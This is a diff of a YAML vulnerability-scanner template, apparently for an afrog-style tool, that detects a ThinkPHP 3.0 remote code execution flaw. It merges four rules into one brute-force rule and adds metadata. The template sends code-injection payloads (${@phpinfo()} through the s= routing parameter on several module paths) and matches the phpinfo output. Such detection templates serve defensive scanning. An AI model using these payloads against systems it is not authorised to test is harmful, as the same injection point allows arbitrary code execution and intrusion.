@@ -1,31 +1,34 @@
-expression: r0() || r1() || r2() || r3()
 id: thinkphp-30-rce
+
 info:
-  author: zan8in
   name: Thinkphp 3.0 RCE
+  author: zan8in
   severity: critical
+  verified: false
+  description: |
+    Thinkphp 3.0 存在远程代码执行漏洞，攻击者可利用漏洞执行任意代码。
+  reference:
+    - https://www.thinkphp.cn/topic/69353.html
+  tags: thinkphp,3,0,rce
+  created: 2025/10/27
+
 rules:
   r0:
-    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
-      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+    brute:
+      mode: clusterbomb
+      commit: winner
+      continue: false
+      p:
+        - "/?s=index/\\think\\module/action/param1/${@phpinfo()}"
+        - "/?s=admin/\\think\\module/action/param1/${@phpinfo()}"
+        - "/?s=api/\\think\\module/action/param1/${@phpinfo()}"
+        - "/?s=manage/\\think\\module/action/param1/${@phpinfo()}"
     request:
       method: GET
-      path: /?s=index/\think\module/action/param1/${@phpinfo()}
-  r1:
-    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
-      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
-    request:
-      method: GET
-      path: /?s=admin/\think\module/action/param1/${@phpinfo()}
-  r2:
-    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
-      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
-    request:
-      method: GET
-      path: /?s=api/\think\module/action/param1/${@phpinfo()}
-  r3:
-    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
-      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
-    request:
-      method: GET
-      path: /?s=manage/\think\module/action/param1/${@phpinfo()}
+      path: "{{p}}"
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'PHP Extension') && 
+      response.body.bcontains(b'PHP Version') && 
+      r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+expression: r0()
